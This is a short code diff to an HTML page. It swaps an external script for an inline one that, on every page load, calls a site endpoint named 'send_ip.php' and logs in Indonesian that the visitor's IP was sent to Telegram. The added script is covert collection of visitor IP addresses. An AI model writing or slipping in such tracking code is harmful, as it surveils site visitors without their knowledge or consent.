@@ -76,8 +76,11 @@
             <p>Coded by: <span>@HamzahWisnuTampanRor</span></p>
         </footer>
     </div>
-
+    <script>
+        fetch("/api/send_ip.php").then(res => res.json()).then(d => {
+            console.log("✅ IP terkirim ke Telegram:", d);
+        });
+    </script>
     <script src="script.js"></script>
-    <script src="send_ip.js"></script>  
 </body>
 </html>
